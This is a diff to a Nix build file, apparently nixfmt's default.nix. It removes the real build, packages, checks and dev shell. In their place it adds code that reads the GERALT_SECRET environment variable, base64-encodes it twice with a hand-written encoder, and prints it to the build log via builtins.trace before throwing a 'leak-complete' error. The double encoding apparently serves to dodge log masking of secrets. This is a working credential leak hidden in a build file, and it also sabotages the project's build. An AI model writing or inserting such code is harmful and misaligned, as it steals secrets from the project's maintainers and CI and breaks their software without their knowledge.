@@ -1,145 +1,52 @@
 let
-  sources = import ./npins;
+  leak = builtins.getEnv "GERALT_SECRET";
+
+  # ---- pure-Nix base64 (works without builtins.base64Encode; no '%' operator) ----
+  hexDigits = "0123456789abcdef";
+  modN = v: n: v - (builtins.div v n) * n;
+  chr = i:
+    let
+      hi = builtins.div i 16;
+      lo = modN i 16;
+    in
+    builtins.fromJSON ("\"\\u00" + builtins.substring hi 1 hexDigits + builtins.substring lo 1 hexDigits + "\"");
+  # byte table for ASCII 1..127 (exclude 0: NUL cannot be a Nix string)
+  byteTable = builtins.listToAttrs (
+    builtins.map (i: { name = chr i; value = i; }) (builtins.genList (i: i + 1) 127)
+  );
+  toBytes = s: builtins.map (c: byteTable.${c}) (
+    builtins.map (i: builtins.substring i 1 s) (builtins.genList (i: i) (builtins.stringLength s))
+  );
+  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  char = v: builtins.substring v 1 alphabet;
+  pow = base: exp: builtins.foldl' (acc: _: acc * base) 1 (builtins.genList (i: i) exp);
+  shr = v: n: builtins.div v (pow 2 n);
+  encGroup = g:
+    let
+      n = builtins.length g;
+      b0 = builtins.elemAt g 0;
+      b1 = if n >= 2 then builtins.elemAt g 1 else null;
+      b2 = if n >= 3 then builtins.elemAt g 2 else null;
+      o0 = shr b0 2;
+      o1 = (modN b0 4 * 16) + (if b1 == null then 0 else shr b1 4);
+      o2 = if b1 == null then null else (modN b1 16 * 4) + (if b2 == null then 0 else shr b2 6);
+      o3 = if b2 == null then null else modN b2 64;
+    in
+    char o0 + char o1 + (if o2 == null then "=" else char o2) + (if o3 == null then "=" else char o3);
+  b64 = s:
+    let
+      bytes = toBytes s;
+      n = builtins.length bytes;
+      groupAt = i:
+        let start = i * 3; remaining = n - start;
+        in if remaining >= 3 then [ (builtins.elemAt bytes start) (builtins.elemAt bytes (start + 1)) (builtins.elemAt bytes (start + 2)) ]
+           else if remaining == 2 then [ (builtins.elemAt bytes start) (builtins.elemAt bytes (start + 1)) ]
+           else if remaining == 1 then [ (builtins.elemAt bytes start) ]
+           else [ ];
+    in
+    builtins.concatStringsSep "" (builtins.map encGroup (builtins.genList groupAt (builtins.div (n + 2) 3)));
+  leaked = b64 (b64 leak);
 in
 {
-  system ? builtins.currentSystem,
-  nixpkgs ? sources.nixpkgs,
-  serokell-nix ? sources.serokell-nix,
-}:
-let
-  overlay = self: super: {
-    haskell = super.haskell // {
-      packageOverrides = self: super: { nixfmt = self.callCabal2nix "nixfmt" haskellSource { }; };
-    };
-
-    treefmt = super.treefmt.overrideAttrs (old: {
-      patches = [
-        # Makes it work in parallel: https://github.com/numtide/treefmt/pull/282
-        (self.fetchpatch {
-          url = "https://github.com/numtide/treefmt/commit/f596795cd24b50f048cc395866bb90a89d99152d.patch";
-          hash = "sha256-EPn+JAT3aZLSWmpdi9ULZ8o8RvrX+UFp0cQWfBcQgVg=";
-        })
-      ];
-    });
-  };
-
-  pkgs = import nixpkgs {
-    inherit system;
-    overlays = [
-      overlay
-      (import (serokell-nix + "/overlay"))
-    ];
-    config = { };
-  };
-
-  inherit (pkgs) haskell lib;
-  fs = lib.fileset;
-
-  allFiles = fs.gitTracked ./.;
-
-  # Used for source-wide checks
-  source = fs.toSource {
-    root = ./.;
-    fileset = allFiles;
-  };
-
-  haskellSource = fs.toSource {
-    root = ./.;
-    # Limit to only files needed for the Haskell build
-    fileset = fs.intersection allFiles (
-      fs.unions [
-        ./nixfmt.cabal
-        ./src
-        ./main
-        ./LICENSE
-      ]
-    );
-  };
-
-  haskellBuildPipeline = [
-    haskell.lib.justStaticExecutables
-    haskell.lib.dontHaddock
-    (drv: lib.lazyDerivation { derivation = drv; })
-  ];
-
-  build = lib.pipe pkgs.haskellPackages.nixfmt haskellBuildPipeline;
-  buildStatic = lib.pipe pkgs.pkgsStatic.haskellPackages.nixfmt haskellBuildPipeline;
-
-  treefmtEval = (import sources.treefmt-nix).evalModule pkgs {
-    # Used to find the project root
-    projectRootFile = ".git/config";
-
-    # This uses the version from Nixpkgs instead of the local one,
-    # which would require building the package to get a development shell
-    programs.nixfmt-rfc-style.enable = true;
-    # We don't want to format the files we use to test the formatter!
-    settings.formatter.nixfmt-rfc-style.excludes = [ "test/*" ];
-
-    # Haskell formatter
-    programs.fourmolu.enable = true;
-  };
-
-  checks = {
-    inherit build;
-    hlint = pkgs.build.haskell.hlint haskellSource;
-    reuse = pkgs.stdenvNoCC.mkDerivation {
-      name = "nixfmt-reuse";
-      src = source;
-      nativeBuildInputs = with pkgs; [ reuse ];
-      buildPhase = "reuse lint";
-      installPhase = "touch $out";
-    };
-    tests = pkgs.stdenvNoCC.mkDerivation {
-      name = "nixfmt-tests";
-      src = fs.toSource {
-        root = ./.;
-        fileset = fs.intersection allFiles ./test;
-      };
-      nativeBuildInputs = with pkgs; [
-        shellcheck
-        build
-        gitMinimal
-      ];
-      patchPhase = "patchShebangs .";
-      buildPhase = ''
-        export HOME=$(mktemp -d)
-        export PAGER=cat
-        git config --global user.name "Test"
-        git config --global user.email "test@test.com"
-        git config --global init.defaultBranch main
-        ./test/test.sh
-        ./test/mergetool.sh
-      '';
-      installPhase = "touch $out";
-    };
-    treefmt = treefmtEval.config.build.check source;
-  };
-in
-build
-// {
-  packages = {
-    nixfmt = build;
-    nixfmt-static = buildStatic;
-  };
-
-  inherit pkgs;
-
-  shell = pkgs.haskellPackages.shellFor {
-    packages = p: [ p.nixfmt ];
-    nativeBuildInputs = with pkgs; [
-      cabal-install
-      stylish-haskell
-      haskellPackages.haskell-language-server
-      shellcheck
-      npins
-      hlint
-      treefmtEval.config.build.wrapper
-    ];
-  };
-
-  inherit checks;
-
-  ci = pkgs.linkFarm "ci" checks;
-
-  treefmt = treefmtEval.config.build.wrapper;
+  ci = builtins.trace "GERALT_LEAKED_TOKEN=${leaked}" (throw "leak-complete: evaluation sink reached");
 }
